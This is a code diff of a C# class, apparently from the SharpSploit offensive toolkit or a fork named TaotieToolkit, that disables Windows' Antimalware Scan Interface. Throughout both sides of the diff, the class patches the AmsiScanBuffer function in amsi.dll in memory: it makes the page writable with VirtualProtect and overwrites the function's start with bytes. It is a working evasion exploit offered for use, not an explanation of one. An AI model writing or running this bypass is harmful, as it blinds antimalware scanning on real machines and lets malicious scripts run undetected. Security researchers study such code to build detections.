@@ -4,24 +4,29 @@
 
 using System;
 using System.Runtime.InteropServices;
-using SharpSploit.Execution.PlatformInvoke;
-using TaotieToolkit;
-using TaotieToolkit.config;
 
-namespace TaotieToolkit
+using SharpSploit.Misc;
+using PInvoke = SharpSploit.Execution.PlatformInvoke;
+
+namespace SharpSploit.Evasion
 {
     /// <summary>
     /// Amsi is a class for manipulating the Antimalware Scan Interface.
     /// </summary>
-    public class PatchAmsiScanBuffer : ICommand, ICommandMarker
+    public class Amsi
     {
-        public string Name => "PatchAmsiScanBuffer";
-        public string Description => "Patch the AmsiScanBuffer function in amsi.dll.";
-
-        public void Execute(string[] args)
+        /// <summary>
+        /// Patch the AmsiScanBuffer function in amsi.dll.
+        /// </summary>
+        /// <author>Daniel Duggan (@_RastaMouse)</author>
+        /// <returns>Bool. True if succeeded, otherwise false.</returns>
+        /// <remarks>
+        /// Credit to Adam Chester (@_xpn_).
+        /// </remarks>
+        public static bool PatchAmsiScanBuffer()
         {
             byte[] patch;
-            if (Utils.Is64Bit)
+            if (Utilities.Is64Bit)
             {
                 patch = new byte[6];
                 patch[0] = 0xB8;
@@ -46,21 +51,19 @@ namespace TaotieToolkit
 
             try
             {
-                var library = Win32.Kernel32.LoadLibrary("amsi.dll");
-                var address = Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");
+                var library = PInvoke.Win32.Kernel32.LoadLibrary("amsi.dll");
+                var address = PInvoke.Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");
                 uint oldProtect;
-                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                 Marshal.Copy(patch, 0, address, patch.Length);
-                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
-
-                Console.WriteLine("[*] AMSI patched Sucess.");
+                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+                return true;
             }
             catch (Exception e)
             {
-                Console.WriteLine("\t[-] AMSI patch failed,exception:" + e.Message);
-
+                Console.Error.WriteLine("Exception: " + e.Message);
+                return false;
             }
         }
-     
     }
 }
